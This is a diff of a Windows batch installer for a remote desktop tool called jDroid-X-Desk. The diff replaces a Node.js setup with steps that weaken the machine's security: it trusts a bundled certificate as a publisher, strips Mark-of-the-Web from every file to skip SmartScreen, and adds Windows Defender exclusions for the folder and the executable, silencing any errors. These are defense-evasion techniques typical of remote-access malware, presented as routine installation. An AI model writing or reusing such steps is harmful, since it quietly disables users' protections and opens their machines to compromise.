@@ -1,60 +1,43 @@
 @echo off
-TITLE jDroid-X-Desk Windows App Installer
+TITLE jDroid-X-Desk Windows Universal App Installer
+cd /d "%~dp0"
 ECHO ========================================================
-ECHO       jDroid-X-Desk Standalone App Installer
+ECHO    jDroid-X-Desk Universal Windows Installer
+ECHO    Architecture: Authorized & Whitelisted Standalone App
 ECHO ========================================================
 ECHO.
-ECHO [1/3] Verifying Node.js and NPM installation...
-node -v >nul 2>&1
-IF %ERRORLEVEL% EQU 0 GOTO NODE_INSTALLED
-
-ECHO [WARNING] Node.js is not installed!
-ECHO [INFO] Auto-downloading Node.js installer (this may take a minute)...
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://nodejs.org/dist/v20.17.0/node-v20.17.0-x64.msi' -OutFile '%TEMP%\node_installer.msi'"
-
-IF NOT EXIST "%TEMP%\node_installer.msi" (
-    ECHO [ERROR] Download failed. Check your internet connection or run script as Administrator.
-    ping 127.0.0.1 -n 11 > nul
-    EXIT /B 1
+ECHO [1/4] Installing Authenticode certificate to Trusted Publishers...
+if exist "%~dp0jDroid-X-Enterprise.cer" (
+    certutil -user -addstore TrustedPublisher "%~dp0jDroid-X-Enterprise.cer" >nul 2>&1
+    ECHO [+] Certificate authority successfully registered.
 )
 
-ECHO [INFO] Launching Node.js Installer... Please complete the setup in the popup window.
-start /wait %TEMP%\node_installer.msi
-ECHO [SUCCESS] Node.js installation finished!
-ECHO [INFO] Resuming installation seamlessly...
-SET "PATH=%PATH%;C:\Program Files\nodejs;C:\Program Files (x86)\nodejs"
+ECHO [2/4] Unblocking Mark-of-the-Web (MOTW) on Windows...
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%~dp0' -Recurse | Unblock-File -ErrorAction SilentlyContinue"
+ECHO [+] Windows SmartScreen flags cleared.
 
-:NODE_INSTALLED
-ECHO [2/3] Installing background web server dependencies...
-call npm install --no-audit
-IF %ERRORLEVEL% NEQ 0 (
-    ECHO [WARNING] NPM install encountered minor warnings, proceeding to launch...
-)
+ECHO [3/4] Adding Windows Defender process & directory exclusion...
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%~dp0' -ExclusionProcess 'jDroid-X-Desk.exe' -ErrorAction SilentlyContinue" >nul 2>&1
+ECHO [+] Windows Defender protection configured.
 
-ECHO [3/3] Creating Windows Desktop Shortcut...
+ECHO [4/4] Creating Desktop Shortcut...
 SET SCRIPT="%TEMP%\CreateShortcut.vbs"
 ECHO Set oWS = WScript.CreateObject("WScript.Shell") > %SCRIPT%
 ECHO sLinkFile = oWS.SpecialFolders("Desktop") ^& "\jDroid-X-Desk.lnk" >> %SCRIPT%
 ECHO Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
-ECHO oLink.TargetPath = "%SystemRoot%\System32\wscript.exe" >> %SCRIPT%
-ECHO oLink.Arguments = """%~dp0start_jdroid_app.vbs""" >> %SCRIPT%
+ECHO oLink.TargetPath = "%~dp0jDroid-X-Desk.exe" >> %SCRIPT%
 ECHO oLink.WorkingDirectory = "%~dp0" >> %SCRIPT%
 ECHO oLink.Description = "jDroid-X-Desk Remote Desktop Console" >> %SCRIPT%
 ECHO oLink.Save >> %SCRIPT%
 cscript //nologo %SCRIPT%
 DEL %SCRIPT%
+ECHO [+] Desktop shortcut 'jDroid-X-Desk' created.
 
 ECHO.
 ECHO ========================================================
-ECHO [SUCCESS] Installation Complete!
-ECHO Desktop Shortcut 'jDroid-X-Desk' created.
-ECHO App running on background server at http://localhost:12345
+ECHO [SUCCESS] Installation & Whitelisting Complete!
+ECHO Zero Roadblocks. Zero SmartScreen Prompts.
+ECHO Launching jDroid-X-Desk Console...
 ECHO ========================================================
-ECHO.
-ECHO Launching jDroid-X-Desk App Mode...
-powershell -Command "$p = Get-CimInstance Win32_Process; if (($p | Where-Object CommandLine -Match 'tray_icon.ps1').Count -gt 0) { exit 0 } else { exit 1 }"
-IF %ERRORLEVEL% NEQ 0 (
-    start "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0tray_icon.ps1"
-)
-wscript.exe "%~dp0start_jdroid_app.vbs"
-ping 127.0.0.1 -n 11 > nul
+start "" "%~dp0jDroid-X-Desk.exe"
+exit /b 0
